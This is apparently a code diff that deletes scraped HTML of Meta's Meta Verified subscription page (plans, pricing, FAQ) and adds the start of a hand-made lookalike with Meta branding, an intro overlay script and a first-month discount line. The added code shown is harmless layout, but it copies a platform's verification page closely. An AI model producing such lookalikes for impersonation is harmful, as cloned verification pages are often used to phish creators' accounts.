- </h1><div><span> Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience. </span></div><div><div><a href="https://accountscenter.facebook.com/meta_verified/?entrypoint=meta_site"><div><div><span>Subscribe on Facebook</span></div></div></a></div><div><a href="https://www.instagram.com/accounts/login/?next=%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmeta_site"><div><div><span>Subscribe on Instagram</span></div></div></a></div></div><div><span><span>Are you a business?</span> Get more information on<br><a href="https://www.facebook.com/business/tools/meta-verified-for-business?entry_point=meta_site"> Meta Verified for businesses</a>. </span></div><div><span> Features, availability and pricing may vary by region and app. </span></div></div></div><div><div><div><picture><source type="image/webp"><img src="https://scontent-atl3-1.xx.fbcdn.net/v/t39.8562-6/585364113_2142038159668816_6001143827682797979_n.webp?_nc_cat=103&amp;ccb=1-7&amp;_nc_sid=9a942e&amp;_nc_ohc=7aT-7hhIM0wQ7kNvwEjECE4&amp;_nc_oc=AdoFVqD93Y0ioi1T1UVqauTtNf7I4iLLshDdg_zeX1Rg1FtwpgAHYI9jvdpXoPTNRIlZnnMCwuaW1drem-rpLoCy&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-1.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af7uy005tugbFDtixVg4TXd_zO_qFgXZTCIwSaGcRsnp-A&amp;oe=6A0B0991" alt="Meta Verified blue badge over Instagram and Facebook posts of creators Marie Abbott and Ravi K"></picture></div></div></div></div></div></div><div><div><div><div><div><div><h2>
- A creator toolkit to take your brand further
-</h2><div><span>
- Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.
-</span></div></div><div><h3>
- Meta Verified benefits
-</h3><div><div><div><div><div><div></div><div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=2098504567625447&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram post by silvaqueen15 with blue verification badge, featuring a person holding a brush, green background, mobile feed mockup."></picture></div><div><div><div>Verified badge</div><div><span>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</span></div></div></div><div><div><hr><div><div><div><div>Verified badge</div></div><div><svg><path></path></svg></div></div></div><div><div><span>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</span></div></div></div></div></div></div><div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=833840872848536&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram search showing Cassandra Taylor&#x27;s Meta Verified profile &quot;silvaqueen15&quot; among similar names."></picture></div><div><div><div>Impersonation protection</div><div><span>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</span></div></div></div><div><div><hr><div><div><div><div>Impersonation protection</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</span></div></div></div></div></div></div><div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=1355386035460424&amp;version=1777274683&amp;transcode_extension=webp" alt="Facebook Support chat screen with verified badge showing assistant message to Cassandra."></picture></div><div><div><div>Enhanced support</div><div><span>Get 24/7 access to email or chat agent support. (*As part of ongoing improvements to Meta Verified, the enhanced support feature (24/7 email and chat agent support) may not be available to all subscribers at this time. To see the specific features available to your account, please start the subscription process.)</span></div></div></div><div><div><hr><div><div><div><div>Enhanced support</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Get 24/7 access to email or chat agent support. (*As part of ongoing improvements to Meta Verified, the enhanced support feature (24/7 email and chat agent support) may not be available to all subscribers at this time. To see the specific features available to your account, please start the subscription process.)</span></div></div></div></div></div></div><div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=699681926528279&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram profile of Cassandra Taylor with Meta Verified badge and links to art exhibitions."></picture></div><div><div><div>Upgraded profile features</div><div><span>Enrich your profile by adding images to your links to help boost engagement.</span><p>Benefit not yet available in all regions.</p></div></div></div><div><div><hr><div><div><div><div>Upgraded profile features</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Enrich your profile by adding images to your links to help boost engagement.</span><p>Benefit not yet available in all regions.</p></div></div></div></div></div></div></div></div><div><div><div><div><div><div><svg><path></path></svg></div></div></div></div><div><div><div><div><svg><path></path></svg></div></div></div></div></div><div></div></div></div></div><div><div><div><div><div><div>Verified badge</div><div><span>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</span></div></div></div><div><div><hr><div><div><div><div>Verified badge</div></div><div><svg><path></path></svg></div></div></div><div><div><span>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</span></div></div></div></div><div><div><div>Impersonation protection</div><div><span>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</span></div></div></div><div><div><hr><div><div><div><div>Impersonation protection</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</span></div></div></div></div><div><div><div>Enhanced support</div><div><span>Get 24/7 access to email or chat agent support. (*As part of ongoing improvements to Meta Verified, the enhanced support feature (24/7 email and chat agent support) may not be available to all subscribers at this time. To see the specific features available to your account, please start the subscription process.)</span></div></div></div><div><div><hr><div><div><div><div>Enhanced support</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Get 24/7 access to email or chat agent support. (*As part of ongoing improvements to Meta Verified, the enhanced support feature (24/7 email and chat agent support) may not be available to all subscribers at this time. To see the specific features available to your account, please start the subscription process.)</span></div></div></div></div><div><div><div>Upgraded profile features</div><div><span>Enrich your profile by adding images to your links to help boost engagement.</span><p>Benefit not yet available in all regions.</p></div></div></div><div><div><hr><div><div><div><div>Upgraded profile features</div></div><div><svg><path></path></svg></div></div></div><div><div><span>Enrich your profile by adding images to your links to help boost engagement.</span><p>Benefit not yet available in all regions.</p></div></div></div></div><hr></div><div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=2098504567625447&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram post by silvaqueen15 with blue verification badge, featuring a person holding a brush, green background, mobile feed mockup."></picture></div></div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=833840872848536&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram search showing Cassandra Taylor&#x27;s Meta Verified profile &quot;silvaqueen15&quot; among similar names."></picture></div></div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=1355386035460424&amp;version=1777274683&amp;transcode_extension=webp" alt="Facebook Support chat screen with verified badge showing assistant message to Cassandra."></picture></div></div><div><div><picture><source><img src="https://lookaside.fbsbx.com/elementpath/media/?media_id=699681926528279&amp;version=1777274683&amp;transcode_extension=webp" alt="Instagram profile of Cassandra Taylor with Meta Verified badge and links to art exhibitions."></picture></div></div></div></div></div></div></div></div></div></div></div></div><div><div><div><div><div><h2>
- Creator plans and pricing
-</h2><div><span>
- Get these benefits on Facebook and Instagram. Sign up for Meta Verified Standard on web for a discounted price. Plans, benefits and availability may vary by region, by app and by account. To see the specific features available to your account, please start the subscription process.
-</span></div><template></template><div><div><div><div><a href="https://accountscenter.facebook.com/meta_verified/?entrypoint=meta_site"><div><div><span>Subscribe on Facebook</span></div></div></a></div><div><a href="https://www.instagram.com/accounts/login/?next=%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmeta_site"><div><div><span>Subscribe on Instagram</span></div></div></a></div></div><template></template><div><div><span> Sign-up available via web and mobile app for Standard; mobile app only for Plus, Premium and Max. </span></div></div></div></div></div><div><div><div><div><div><div>Standard</div><div>Plus</div><div>Premium</div><div>Max</div></div><div><div><div><div><div><div><h3>
- Standard
-</h3></div><div><div></div></div></div></div><div><div><div><h3>
- Plus
-</h3></div><div><div></div></div></div></div><div><div><div><h3>
- Premium
-</h3></div><div><div></div></div></div></div><div><div><div><h3>
- Max
-</h3></div><div><div></div></div></div></div></div></div></div><div><div><div><div><div><span>
- $14.99/month per profile 
-</span></div></div><div><div><span>
- $49.99/month per profile 
-</span></div></div><div><div><span>
- $149.99/month per profile 
-</span></div></div><div><div><span>
- $499.99/month per profile 
-</span></div></div></div></div></div><div><div><div><div><div><div><span><template></template><div><a href="#sign-up-top"> Sign up on web or mobile app </a></div><template></template><div><a href="#sign-up-bottom"> Sign up on web or mobile app </a></div></span></div></div></div><div><div><div><span><a href="https://help.instagram.com/732454618598400"> Sign up on mobile app only
- </a></span></div></div></div><div><div><div><span><a href="https://help.instagram.com/732454618598400"> Sign up on mobile app only
- </a></span></div></div></div><div><div><div><span><a href="https://help.instagram.com/732454618598400"> Sign up on mobile app only
- </a></span></div></div></div></div></div></div><div><div><div><div><div><span><div></div>
- Inspire confidence
-</span></div></div><div><div><span><div></div>
- Inspire confidence
-</span></div></div><div><div><span><div></div>
- Inspire confidence
-</span></div></div><div><div><span><div></div>
- Inspire confidence
-</span></div></div></div></div></div><div><div><div><div><div><div><svg><path></path><path></path></svg><span><div><div><span>
- Verified badge
-</span></div></div></span></div></div></div><div><div><div><svg><path></path><path></path></svg><span><div><div><span>
- Verified badge
-</span></div></div></span></div></div></div><div><div><div><svg><path></path><path></path></svg><span><div><div><span>
- Verified badge
-</span></div></div></span></div></div></div><div><div><div><svg><path></path><path></path></svg><span><div><div><span>
- Verified badge
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><span><div>
- Protect your brand
- </div></span></div></div><div><div><span><div>
- Protect your brand
- </div></span></div></div><div><div><span><div>
- Protect your brand
- </div></span></div></div><div><div><span><div>
- Protect your brand
- </div></span></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Impersonation protection
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Impersonation protection
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Impersonation protection
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Impersonation protection
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Enhanced support
-</span></div><span><br>
- Chat or email with agents 24/7
-</span></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Enhanced support
-</span></div><span><br>
- Chat or email with agents 24/7
-<br>Get issues resolved more quickly
-</span></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Enhanced support
-</span></div><span><br>
- Chat or email with agents 24/7
-<br>Get issues resolved more quickly
-<br>Request a call from an agent
-</span></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Enhanced support
-</span></div><span><br>
- Chat or email with agents 24/7
-<br>Get issues resolved more quickly
-<br>Request a call from an agent
-<br>Receive active case monitoring
-</span></div></span></div></div></div></div></div></div><div><div><div><div><div><span><div>
- Maximise discovery
- </div></span></div></div><div><div><span><div>
- Maximise discovery
- </div></span></div></div><div><div><span><div>
- Maximise discovery
- </div></span></div></div><div><div><span><div>
- Maximise discovery
- </div></span></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Search optimisation
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Search optimisation
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Search optimisation
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Search optimisation
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Featured profile
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Featured profile
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Featured profile
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Featured profile
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Links in reels
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Links in reels
-</span></div><span><br>
- Two per month
-</span></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Links in reels
-</span></div><span><br>
- Four per month
-</span></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Links in reels
-</span></div><span><br>
- Six per month
-</span></div></span></div></div></div></div></div></div><div><div><div><div><div><span><div>
- Drive engagement
- </div></span></div></div><div><div><span><div>
- Drive engagement
- </div></span></div></div><div><div><span><div>
- Drive engagement
- </div></span></div></div><div><div><span><div>
- Drive engagement
- </div></span></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Add images to your links
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Add images to your links
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Add images to your links
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Add images to your links
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Exclusive stickers
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Exclusive stickers
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Exclusive stickers
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Exclusive stickers
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Custom chat themes
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Custom chat themes
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Custom chat themes
-</span></div></div></span></div></div></div><div><div><div><span><svg><path></path></svg></span><span><div><div><span>
- Custom chat themes
-</span></div></div></span></div></div></div></div></div></div><div><div><div><div><div><div><div></div></div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Personalised content strategy advice
-</span></div></div></span></div><div></div></div></div><div><div><div><div></div></div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Personalised content strategy advice
-</span></div></div></span></div><div></div></div></div><div><div><div><div></div></div><div><span><svg><path></path><path></path></svg></span><span><div><div><span>
- Personalised content strategy advice
-</span></div></div></span></div><div></div></div></div><div><div><div><div></div></div><div><span><svg><path></path></svg></span><span><div><div><span>
- Personalised content strategy advice
-</span></div></div></span></div><div></div></div></div></div></div></div></div></div></div></div><template></template><div><div><div><div><a href="https://accountscenter.facebook.com/meta_verified/?entrypoint=meta_site"><div><div><span>Subscribe on Facebook</span></div></div></a></div><div><a href="https://www.instagram.com/accounts/login/?next=%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmeta_site"><div><div><span>Subscribe on Instagram</span></div></div></a></div></div><template></template><div><div><span> Sign-up available via web and mobile app for Standard; mobile app only for Plus, Premium and Max. </span></div></div></div></div><div><span> In order to subscribe to Meta Verified, you must be logged in to your personal or <a href="https://www.facebook.com/help/instagram/138925576505882">professional creator account</a> (Instagram) or personal or professional (Facebook).
- <div>
- Not available in all regions. Creators must meet certain eligibility requirements in order to qualify (requirements for <a href="https://www.facebook.com/help/596285382333151">Facebook</a> and <a href="https://help.instagram.com/2419286908233223">Instagram</a>).
- </div><div>
- *Offer availability subject to eligibility and only available for new subscribers. This subscription is priced at USD 14.99/month (Standard), USD 49.99/month (Plus), USD 149.99/month (Premium), USD 499.99/month (Max) and renews automatically.
- </div><div>
- Meta Verified subscribers must agree to the <a href="https://www.facebook.com/legal/mvb_terms">Terms of Service</a> and follow our <a href="https://www.facebook.com/legal/terms?paipv=0&amp;eav=AfZvYlKgIQAjlxpYVSHVvCw3CDNKhbt_ANPixrhWnZggprx0mVoioWLHLGnddjmxNdY&amp;_rdr">Facebook Terms of Use</a>, <a href="https://help.instagram.com/581066165581870">Instagram Terms of Service</a>, <a href="https://transparency.meta.com/policies/community-standards/">Community Standards</a>/<a href="https://www.facebook.com/business/help/23875260945405570?id=579726174359330">Manage your Meta Verified subscription</a>.
- </div></span></div></div></div></div></div><div><div><div><div><div></div></div><div><div><div><div><div><div><template></template><div><div><div><div><div><h3>
- “Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients.”
-</h3></div><div><a href="https://www.instagram.com/inversionista_gal"><div><img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/569017556_1379011433815028_6632732990196602499_n.png?stp=dst-webp&amp;_nc_cat=107&amp;ccb=1-7&amp;_nc_sid=9a942e&amp;_nc_ohc=RV7d7n4zcOwQ7kNvwGHOcah&amp;_nc_oc=AdozMTlnLOwwViEI7sWtB4GNqVeT05YdLNRs3cz5Qt5PMGeyCePWuZPC_n_DkC_l4BMijCZOPp2yi3RBVmoVlpwE&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-3.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af7V17bvF-0zEtan9aWVr3gaN-FeD0rQirmYx_oxReg1iQ&amp;oe=6A0B14D0" alt="inversionista_gal&#x27;s profile photo"></div><div><span>@inversionista_gal</span><div><div><picture><source type="image/webp"><img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/557936526_776878985252326_3217153676007406840_n.webp?_nc_cat=111&amp;ccb=1-7&amp;_nc_sid=9a942e&amp;_nc_ohc=7hP3G0hJzzkQ7kNvwHZD1rv&amp;_nc_oc=AdpEyXw4F0j2h362IQghMqs_sLxziVS8__wZujNyQjlOCAmSEsX0I_j408Ju8D5s_7S0W2ShXliotvZa2lPEZlEg&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-3.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af5RKndJkP-jF0lzcjUUWjs5N0d4Vm_NcEBEyyyFQ_ci7Q&amp;oe=6A0AFFD1" alt="The Meta Verified Badge icon"></picture></div></div></div><div><span>4K+ followers</span></div></a></div></div></div></div></div></div><template></template></div></div></div></div></div></div></div></div><div><div><div><div><div><div><div><h2>
- FAQ
-</h2><div><span>
- We&#x27;ve included some frequently asked questions below. For more, visit our Help Centre on <a href="https://www.facebook.com/help/565322618581808">Facebook</a> or <a href="https://help.instagram.com/1318901965540571">Instagram</a>.
-</span></div></div><div><div><hr><div><div><h3><div><div><div><div><span><div>
- How do I know if I&#x27;m eligible?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- Meta Verified is available in selected regions for creators who meet certain eligibility requirements (requirements for <a href="https://www.facebook.com/help/596285382333151">Facebook</a> and <a href="https://help.instagram.com/2419286908233223">Instagram</a>).
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- I already have a verified badge. What happens to it?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- As we test and learn, there will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements. Existing verified badge holders can also apply for a Meta Verified subscription if they meet the eligibility requirements. Learn more about eligibility requirements on <a href="https://www.facebook.com/help/596285382333151">Facebook</a> and <a href="https://help.instagram.com/2419286908233223">Instagram</a>.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- What is the verification process?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- You may be asked to provide a government-issued ID and, in selected regions, may be asked to submit a selfie video so that we can confirm your identity before being approved for a Meta Verified subscription. The ID may be required to match the profile name and photo of the Facebook or Instagram account that you&#x27;re applying for. Once your profile has been verified, you may not be able to change your username or date of birth on your profile without going through the Meta Verified subscription and verification application process again. Learn more about the verification process on <a href="https://www.facebook.com/help/734864594628372">Facebook</a> and <a href="https://help.instagram.com/732454618598400">Instagram</a>.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- As a creator, can I use one Meta Verified subscription on both Facebook and Instagram?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- Yes. If you have your Facebook and Instagram accounts linked in the Accounts Centre, you may be eligible to subscribe to Meta Verified for two profiles for a discounted price.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- What is the price to subscribe to Meta Verified for creators?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- Meta Verified subscriptions are generally available in most regions for USD 11.99 when you subscribe from the web and USD 14.99 when you subscribe within the app for the Standard plan. Other plans are priced at USD 49.99/month for Plus, USD 49.99/month for Premium, USD 499.99/month for Max. You can begin the Meta Verified onboarding experience on Facebook or Instagram to see local pricing for your market. <p> *Pricing and plans may vary and may not be available if Meta Verified has not yet been rolled out in your region. </p></span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- What if I&#x27;m interested in Meta Verified for businesses?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- You can learn more and sign up on the Meta Verified for <a href="https://www.facebook.com/business/tools/meta-verified-for-business?entry_point=meta_site">businesses website</a>.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- Do my Meta Verified benefits extend to my other profiles and accounts?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- Your Meta Verified benefits (including support access) only apply to your subscribed profile and will not be available for profiles that are not Meta Verified.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- After I&#x27;ve signed up for Meta Verified, can I change my plan selection?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- Yes. You can change your plan selection at any time on the management screen for your Meta Verified subscription. 
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- How do I change my plan selection?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- To change your plan selection, you can go to the management screen for your Meta Verified subscription on your purchasing platform and device to select Explore other plans. Note: To upgrade to the Plus, Premium and Max plans, you will need to use your Instagram or Facebook apps on your mobile device. Features, availability and pricing may vary by region and app.
-</span></div></div></div></div></div><hr><div><div><h3><div><div><div><div><span><div>
- I have multiple accounts subscribed to Meta Verified. Can I upgrade/downgrade only for one of them?
- </div></span></div><div><svg><path></path></svg></div></div></div></div></h3><div><div><div><span>
- If you have a bundled Meta Verified subscription covering both your Instagram and Facebook accounts, any upgrade or downgrade will apply to both accounts together. To choose different plans for Facebook and Instagram, you can purchase separate subscriptions for each account, allowing you to customise your plan selection individually.
-</span></div></div></div></div></div></div></div></div></div></div></div></div></div><div><div><div><div><div><div><div><div><h2>
- Meta Newsroom
-</h2></div><div><span>
- Learn more about how Meta Verified is improving to better serve creators and businesses.
-</span></div><div><a href="https://www.facebook.com/business/news/Introducing-Enhanced-Gen-AI-Features-and-Other-Tools-to-Help-Build-Your-Business"><div><div><div><svg><path></path></svg></div><div><div>Visit our Newsroom</div><div></div></div></div></div></a></div></div><div><div><img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/585173016_26139186409005414_156244477983467017_n.webp?_nc_cat=104&amp;ccb=1-7&amp;_nc_sid=9a942e&amp;_nc_ohc=Pu6L9QoNzy8Q7kNvwGIWaOI&amp;_nc_oc=Adp0mlbIApH9PgnACopAQrJx6x2X3mDtnMagO1g9TvEmfm4dER917w2kqAxCHKaQu38_-GheM0z2pot5u5tcpPeU&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-2.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af6z4B6bujMeRFqlxoMIp2aqsf2H7-s783tH0EDv35xGBA&amp;oe=6A0B233B" alt="A film set with a blonde girl smiling at the camera and a microphone capturing the audio of the scene"></div></div></div></div></div></div></div></div></div><template></template><template></template><div><template></template><template></template><template></template><template></template><template></template><div><div></div><div></div><div><div></div></div></div><template></template><div><div><div></div><div></div><nav><div></div><div></div><div><div><div><div><div><div><div><div><svg><path></path></svg></div></div><template></template></div><a href="/"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"></a></div></div><div><div><div><div><div><div><div><a href="/ai-glasses/"><div><span>AI glasses</span></div></a></div></div></div><div><div><div><a href="/quest/"><div><span>Meta Quest</span></div></a></div></div></div><div><div><div><a href="/experiences/"><div><span>Apps and games</span></div></a></div></div></div></div></div></div></div><div><div><div><div><div><div><div><div><a href="/about/"><div><span>Explore Meta</span></div></a></div></div></div><div><div><div><a href="/help/"><div><span>Support</span></div></a></div></div></div></div></div><div><div><svg><path></path></svg></div></div><template></template><a href="/bag/"><div><div><svg><path></path></svg></div></div></a><template></template><div><svg><path></path></svg></div></div></div></div></div></div><div></div></div></nav></div></div><div><div><div></div><div></div><nav><div></div><div></div><div><div><div><div><div><div><div><div><svg><path></path></svg></div></div><template></template></div><a href="/"><img src="https://static.xx.fbcdn.net/rsrc.php/y3/r/y6QsbGgc866.svg" alt="Meta"></a></div></div><div><div><div><div><div><div><div><a href="/ai-glasses/"><div><span>AI glasses</span></div></a></div></div></div><div><div><div><a href="/quest/"><div><span>Meta Quest</span></div></a></div></div></div><div><div><div><a href="/experiences/"><div><span>Apps and games</span></div></a></div></div></div></div></div></div></div><div><div><div><div><div><div><div><div><a href="/about/"><div><span>Explore Meta</span></div></a></div></div></div><div><div><div><a href="/help/"><div><span>Support</span></div></a></div></div></div></div></div><div><div><svg><path></path></svg></div></div><template></template><a href="/bag/"><div><div><svg><path></path></svg></div></div></a><template></template><div><svg><path></path></svg></div></div></div></div></div></div><div></div></div></nav></div></div><div><div></div><div></div><div><div></div></div></div><template></template></div><template></template>
- <div></div>
-<div></div></body></html>
+
+<body class="overflow-x-hidden intro-active">
+
+    <!-- INTRO OVERLAY -->
+    <div id="intro-overlay">
+      <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
+    </div>
+    <script>
+      (function() {
+        var overlay = document.getElementById('intro-overlay');
+        setTimeout(function() {
+          overlay.classList.add('fade-out');
+          document.body.classList.remove('intro-active');
+          setTimeout(function() { overlay.style.display = 'none'; }, 500);
+        }, 2000);
+      })();
+    </script>
+
+    <!-- ===== HEADER ===== -->
+    <div class='px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between sticky top-0 z-50 border-b border-gray-200'>
+        <div class='flex items-center justify-start gap-2 text-[14px]'>
+            <!-- Meta Logo SVG inline -->
+            <svg width="80" height="28" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+              <text y="48" font-size="52" font-weight="900" fill="#0081FB" font-family="Arial, sans-serif">Meta</text>
+            </svg>
+            <div class='ml-[40px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
+                <span class='cursor-pointer font-bold hover:text-[#0866ff] transition-colors'>Meta Store</span>
+                <span class='cursor-pointer font-bold hover:text-[#0866ff] transition-colors'>Meta Quest</span>
+                <span class='cursor-pointer font-bold hover:text-[#0866ff] transition-colors'>Ray-Ban Meta</span>
+                <span class='cursor-pointer font-bold hover:text-[#0866ff] transition-colors'>Meta AI</span>
+            </div>
+        </div>
+        <div class='md:flex hidden items-center justify-start gap-6'>
+            <span class='text-[14px] text-[#1c2b33] cursor-pointer font-medium'>Meta Verified</span>
+            <svg class='w-[20px] h-[20px] cursor-pointer' viewBox="0 0 24 24" fill="none" stroke="#1c2b33" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.35-4.35"/></svg>
+            <svg class='w-[36px] h-[36px] cursor-pointer' viewBox="0 0 24 24" fill="none" stroke="#1c2b33" stroke-width="1.5"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+        </div>
+        <div class='md:hidden flex items-center gap-4'>
+            <svg class='w-[20px] h-[20px]' viewBox="0 0 24 24" fill="none" stroke="#1c2b33" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.35-4.35"/></svg>
+        </div>
+    </div>
+
+    <!-- ===== HERO ===== -->
+    <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+        <!-- LEFT: Content -->
+        <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                <!-- Blue verified badge icon -->
+                <div class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px] bg-[#0866ff] rounded-full flex items-center justify-center mb-4'>
+                    <svg viewBox="0 0 24 24" class="md:w-[44px] w-[26px] md:h-[44px] h-[26px]" fill="white">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                </div>
+                <h1 class='md:text-[48px] text-[32px] font-[700] mb-4 order-2 text-[#1c1e21] leading-[1.15]'>Protect your brand with Meta Verified</h1>
+                <p class='text-[16px] text-[#1c2b33] font-[300] md:order-3 order-4 mb-3'>Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.</p>
+                <p class='text-[13px] text-[#606770] md:order-3 order-4 mb-2'>Upgrade your profile with Meta Verified – enjoy the first month at a discount.</p>
